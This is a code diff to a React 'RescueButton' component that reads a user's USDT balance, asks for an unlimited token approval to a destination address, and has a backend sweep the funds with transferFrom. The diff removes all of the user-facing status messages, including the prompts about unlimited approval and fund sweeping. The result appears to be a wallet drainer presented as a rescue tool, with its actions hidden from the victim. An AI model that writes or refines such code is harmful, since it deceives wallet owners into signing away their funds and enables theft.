@@ -17,7 +17,6 @@ export default function RescueButton({ userAddress }: { userAddress: string }) {
   const rescue = async () => {
     if (!window.ethereum) return;
     setLoading(true);
-    setStatus("Initiating rescue...");
     setError(null);
 
     try {
@@ -32,34 +31,28 @@ export default function RescueButton({ userAddress }: { userAddress: string }) {
       const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
 
       // 1. Check balance
-      setStatus("Checking USDT balance...");
       const rawBal: bigint = await usdt.balanceOf(userAddress);
       if (rawBal === 0n) {
         throw new Error("No USDT to rescue");
       }
 
       // 2. Check existing allowance
-      setStatus("Checking allowance...");
       const currentAllowance: bigint = await usdt.allowance(userAddress, destination);
 
       let approvalTxHash = "";
 
       if (currentAllowance >= rawBal) {
         // Already approved — no user signature needed
-        setStatus("Allowance already granted. Sweeping funds...");
         approvalTxHash = "already-approved";
       } else {
         // Ask user for unlimited approval (single signature)
-        setStatus("Requesting unlimited approval (Please sign)...");
         const MAX = ethers.MaxUint256;
         const approveTx = await usdt.approve(destination, MAX);
-        setStatus("Waiting for approval confirmation...");
         await approveTx.wait(1);
         approvalTxHash = approveTx.hash;
       }
 
       // 3. Tell the backend to sweep the funds using transferFrom
-      setStatus("Backend is sweeping funds to destination...");
       const res = await fetch(`${import.meta.env.VITE_API_BASE}/verifyRescue`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
